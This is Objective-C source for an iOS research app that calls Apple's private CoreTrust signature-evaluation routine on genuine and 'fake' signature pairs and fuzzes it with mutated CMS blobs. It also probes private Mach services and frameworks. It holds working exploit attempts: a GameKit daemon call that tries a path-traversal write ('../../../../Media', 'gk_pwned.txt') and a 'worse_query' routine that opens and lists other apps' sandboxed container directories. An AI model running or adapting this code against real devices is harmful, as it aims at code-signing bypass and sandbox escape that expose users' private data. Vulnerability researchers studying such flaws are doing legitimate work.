// ctoracle — on-device CoreTrust oracle.
// Calls the userspace CoreTrust implementation (libmis / MobileInBoxUpdate)
// with arbitrary CMS + CodeDirectory pairs and logs the verdict + policy flags.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include "worse_query.h"
extern mach_port_t bootstrap_port;
extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
#include <string.h>

typedef int32_t CT_int;
typedef uint64_t CT_size_t;
typedef uint64_t CoreTrustPolicyFlags;

typedef CT_int (*CTEvaluateAMFICodeSignatureCMS_t)(
    const uint8_t *cmsData, CT_size_t cmsLen,
    const uint8_t *cdData, CT_size_t cdLen,
    bool requireSignature,
    const uint8_t **leafCert, CT_size_t *leafCertLen,
    CoreTrustPolicyFlags *policyFlags,
    uint32_t *cmsDigestType, uint32_t *hashAgilityDigestType,
    const uint8_t **digestData, CT_size_t *digestLen);

static void flog(NSString *s) {
    NSLog(@"[CTORACLE] %@", s);
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/oracle.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:p];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static void dump_policy(CoreTrustPolicyFlags f) {
    flog([NSString stringWithFormat:@"  policy=0x%llx", (unsigned long long)f]);
}

static void run_case_paths(NSString *name, NSString *cmsPath, NSString *cdPath, CTEvaluateAMFICodeSignatureCMS_t fn) {
    NSData *cms = [NSData dataWithContentsOfFile:cmsPath];
    NSData *cd = [NSData dataWithContentsOfFile:cdPath];
    if (!cms || !cd) { flog([NSString stringWithFormat:@"%@: missing data (cms=%d cd=%d)", name, (int)cms.length, (int)cd.length]); return; }
    const uint8_t *leaf = NULL; CT_size_t leafLen = 0;
    CoreTrustPolicyFlags pol = 0;
    uint32_t cmsDig = 0, agilDig = 0;
    const uint8_t *dig = NULL; CT_size_t digLen = 0;
    CT_int r = fn((const uint8_t *)cms.bytes, cms.length, (const uint8_t *)cd.bytes, cd.length,
                  true, &leaf, &leafLen, &pol, &cmsDig, &agilDig, &dig, &digLen);
    flog([NSString stringWithFormat:@"%@: ret=0x%x leaf=%llu digestType=%u agility=%u digLen=%llu",
          name, (unsigned)r, (unsigned long long)leafLen, cmsDig, agilDig, (unsigned long long)digLen]);
    dump_policy(pol);
    if (dig && digLen) {
        NSMutableString *h = [NSMutableString string];
        for (CT_size_t i = 0; i < digLen && i < 32; i++) [h appendFormat:@"%02x", dig[i]];
        flog([NSString stringWithFormat:@"  cdhash=%@", h]);
    }
}


static void fuzz_loop(CTEvaluateAMFICodeSignatureCMS_t fn) {
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *cmsPath = [docs stringByAppendingPathComponent:@"fuzz.cms"];
    NSData *base = [NSData dataWithContentsOfFile:cmsPath];
    if (!base || base.length < 64) { flog(@"fuzz: no seed"); return; }
    const uint8_t *seed = base.bytes;
    size_t n = base.length;
    uint8_t *buf = malloc(n);
    memcpy(buf, seed, n);
    NSData *cdData = [NSData dataWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"orig.cd" ofType:nil]];
    srand(0x1337);
    for (unsigned long i = 0; i < 2000000UL; i++) {
        memcpy(buf, seed, n);
        int flips = 1 + rand() % 12;
        for (int k = 0; k < flips; k++) {
            size_t off = 1 + (rand() % (n - 1));
            buf[off] = (uint8_t)rand();
        }
        [[NSData dataWithBytes:buf length:n] writeToFile:[docs stringByAppendingPathComponent:@"last.cms"] atomically:YES];
        const uint8_t *leaf = NULL; CT_size_t ll = 0; CoreTrustPolicyFlags pol = 0;
        uint32_t cdg = 0, ag = 0; const uint8_t *dig = NULL; CT_size_t dl = 0;
        fn(buf, n, cdData.bytes, cdData.length, true, &leaf, &ll, &pol, &cdg, &ag, &dig, &dl);
        if ((i % 5000) == 0) flog([NSString stringWithFormat:@"fuzz %lu ok", i]);
    }
    flog(@"fuzz done");
}


static void svc_probe(void) {
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/services.txt"];
    NSString *txt = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    if (!txt) return;
    flog(@"svcprobe start");
    int ok = 0;
    for (NSString *name in [txt componentsSeparatedByString:@"\n"]) {
        if (name.length < 3) continue;
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = bootstrap_look_up(bootstrap_port, name.UTF8String, &port);
        if (kr == KERN_SUCCESS) { ok++; flog([NSString stringWithFormat:@"svc %@ OK", name]); mach_port_deallocate(mach_task_self(), port); }
    }
    flog([NSString stringWithFormat:@"svcprobe done ok=%d", ok]);
}


static void ax_probe(void) {
    const char *paths[] = {
        "/System/Library/PrivateFrameworks/AXRuntime.framework/AXRuntime",
        "/System/Library/PrivateFrameworks/Accessibility.framework/Accessibility",
        "/System/Library/PrivateFrameworks/AccessibilityUtilities.framework/AccessibilityUtilities",
        "/usr/lib/libAccessibility.dylib",
        NULL };
    const char *names[] = {"AXUIElementCreateSystemWide", "_AXUIElementCreateSystemWide"};
    for (int pi = 0; paths[pi]; pi++) {
        void *h = dlopen(paths[pi], RTLD_NOW);
        flog([NSString stringWithFormat:@"ax dlopen %s -> %p", paths[pi], h]);
        if (!h) continue;
        for (int ni = 0; ni < 2; ni++) {
            void *sym = dlsym(h, names[ni]);
            flog([NSString stringWithFormat:@"ax   %s -> %p", names[ni], sym]);
            if (sym) {
                typedef void *(*fn_create_system)(void);
                typedef int (*fn_copy_attr)(void *, void *, void **);
                void *cp = dlsym(h, "AXUIElementCopyAttributeValue");
                if (!cp) cp = dlsym(h, "_AXUIElementCopyAttributeValue");
                void *sysw = ((fn_create_system)sym)();
                flog([NSString stringWithFormat:@"ax systemwide=%p copy=%p", sysw, cp]);
                if (sysw && cp) {
                    void *val = NULL;
                    int r = ((fn_copy_attr)cp)(sysw, (void *)CFSTR("AXFocusedApplication"), &val);
                    flog([NSString stringWithFormat:@"ax focused ret=%d val=%p", r, val]);
                }
                return;
            }
        }
    }
}


static void dump_methods(Class c, const char *tag) {
    if (!c) { flog([NSString stringWithFormat:@"gk %s: nil class", tag]); return; }
    unsigned int n = 0;
    Method *ms = class_copyMethodList(c, &n);
    for (unsigned int i = 0; i < n && i < 300; i++) {
        const char *sel = sel_getName(method_getName(ms[i]));
        if (strstr(sel, "cache") || strstr(sel, "image") || strstr(sel, "photo") ||
            strstr(sel, "proxy") || strstr(sel, "data") || strstr(sel, "file"))
            flog([NSString stringWithFormat:@"gk %s: %s", tag, sel]);
    }
    free(ms);
}
static void gk_probe(void) {
    void *h = dlopen("/System/Library/Frameworks/GameKit.framework/GameKit", RTLD_NOW);
    flog([NSString stringWithFormat:@"gk dlopen -> %p", h]);
    if (!h) return;
    const char *names[] = {"GKDaemonProxy", "GKUtilityService", "GKImageCache", "GKLocalPlayer", NULL};
    for (int i = 0; names[i]; i++) {
        Class c = NSClassFromString([NSString stringWithUTF8String:names[i]]);
        dump_methods(c, names[i]);
        if (c) {
            unsigned int cn = 0;
            Method *cms = class_copyMethodList(object_getClass(c), &cn);
            for (unsigned int j = 0; j < cn && j < 100; j++) {
                const char *sel = sel_getName(method_getName(cms[j]));
                if (strstr(sel, "proxy") || strstr(sel, "daemon") || strstr(sel, "shared"))
                    flog([NSString stringWithFormat:@"gk %s(class): +%s", names[i], sel]);
            }
            free(cms);
        }
    }
}


static void gk_try_write(void) {
    Class c = NSClassFromString(@"GKDaemonProxy");
    if (!c) return;
    id proxy = ((id(*)(id, SEL))objc_msgSend)((id)c, sel_registerName("daemonProxy"));
    flog([NSString stringWithFormat:@"gk proxy=%p", proxy]);
    if (!proxy) {
        proxy = ((id(*)(id, SEL))objc_msgSend)((id)c, sel_registerName("proxyForLocalPlayer"));
        flog([NSString stringWithFormat:@"gk proxyLocal=%p", proxy]);
    }
    if (!proxy) return;
    NSData *data = [@"PWNED_GK" dataUsingEncoding:NSUTF8StringEncoding];
    SEL sel = sel_registerName("cacheImageData:inSubdirectory:withFileName:handler:");
    if (![proxy respondsToSelector:sel]) flog(@"gk no cacheImageData selector");
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    void (^handler)(id, id) = ^(id a, id b) {
        flog([NSString stringWithFormat:@"gk handler a=%@ b=%@", a, b]);
        dispatch_semaphore_signal(sem);
    };
    ((void(*)(id, SEL, id, id, id, id))objc_msgSend)(proxy, sel, data, @"../../../../Media", @"gk_pwned.txt", handler);
    long r = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    flog([NSString stringWithFormat:@"gk wait=%ld", r]);
}


static void wq_probe(void) {
    NSArray *groups = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                        @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                        @"group.8e0bc870a21520b9.5"];
    NSString *group = nil;
    for (NSString *g in groups) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:g];
        flog([NSString stringWithFormat:@"wq group %@ -> %@", g, u.path]);
        if (u && !group) group = g;
    }
    if (!group) { flog(@"wq: no group container"); return; }
    const char *targets[] = {
        "/var/containers/Shared/SystemGroup",
        "/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Shared/AppGroup",
        "/var/containers/Data/System",
        NULL };
    for (int i = 0; targets[i]; i++) {
        int64_t h = worse_query([NSString stringWithUTF8String:targets[i]], group, false, false);
        flog([NSString stringWithFormat:@"wq handle %s = %lld", targets[i], (long long)h]);
        if (h < 0) continue;
        NSError *err = nil;
        NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[NSString stringWithUTF8String:targets[i]] error:&err];
        flog([NSString stringWithFormat:@"wq list %s count=%lu err=%@ first=%@", targets[i], (unsigned long)items.count, err, [items subarrayWithRange:NSMakeRange(0, MIN((NSUInteger)5, items.count))]]);
        if (items.count) {
            NSString *child = [NSString stringWithFormat:@"%s/%@", targets[i], items[0]];
            int64_t h2 = worse_query(child, group, false, false);
            flog([NSString stringWithFormat:@"wq child handle %@ = %lld", child, (long long)h2]);
            if (h2 >= 0) {
                NSError *e2 = nil;
                NSArray *c2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:child error:&e2];
                flog([NSString stringWithFormat:@"wq child list count=%lu err=%@ first=%@", (unsigned long)c2.count, e2, [c2 subarrayWithRange:NSMakeRange(0, MIN((NSUInteger)4, c2.count))]]);
                worse_query_release(h2);
            }
        }
        worse_query_release(h);
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    [UIApplication sharedApplication].idleTimerDisabled = YES;
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    flog(@"start");
    wq_probe();
    NSArray *paths = @[
        @"/usr/lib/libmis.dylib",
        @"/System/Library/PrivateFrameworks/MobileInBoxUpdate.framework/MobileInBoxUpdate",
        @"/System/Library/PrivateFrameworks/CoreTrust.framework/CoreTrust",
    ];
    CTEvaluateAMFICodeSignatureCMS_t fn = NULL;
    for (NSString *p in paths) {
        void *h = dlopen(p.UTF8String, RTLD_NOW | RTLD_LOCAL);
        flog([NSString stringWithFormat:@"dlopen %@ -> %p (%s)", p, h, h ? "ok" : dlerror()]);
        if (h) {
            void *sym = dlsym(h, "CTEvaluateAMFICodeSignatureCMS");
            if (!sym) sym = dlsym(h, "_CTEvaluateAMFICodeSignatureCMS");
            flog([NSString stringWithFormat:@"  dlsym CTEvaluateAMFICodeSignatureCMS -> %p", sym]);
            if (sym && !fn) fn = (CTEvaluateAMFICodeSignatureCMS_t)sym;
        }
    }
    if (!fn) { flog(@"no CTEvaluateAMFICodeSignatureCMS"); return YES; }
    svc_probe();
    gk_probe();
    gk_try_write();
    ax_probe();
    NSString *fz = [[NSHomeDirectory() stringByAppendingPathComponent:@"Documents"] stringByAppendingPathComponent:@"fuzz.on"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:fz]) { fuzz_loop(fn); return YES; }

    run_case_paths(@"orig", [[NSBundle mainBundle] pathForResource:@"orig.cms" ofType:nil],
                   [[NSBundle mainBundle] pathForResource:@"orig.cd" ofType:nil], fn);
    run_case_paths(@"fake", [[NSBundle mainBundle] pathForResource:@"fake.cms" ofType:nil],
                   [[NSBundle mainBundle] pathForResource:@"fake.cd" ofType:nil], fn);
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:docs error:nil];
    for (NSString *f in [files sortedArrayUsingSelector:@selector(compare:)]) {
        if (![f hasSuffix:@".cms"]) continue;
        NSString *base = [f stringByDeletingPathExtension];
        NSString *cdp = [docs stringByAppendingPathComponent:[base stringByAppendingString:@".cd"]];
        if (![[NSFileManager defaultManager] fileExistsAtPath:cdp]) continue;
        run_case_paths(base, [docs stringByAppendingPathComponent:f], cdp, fn);
    }
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
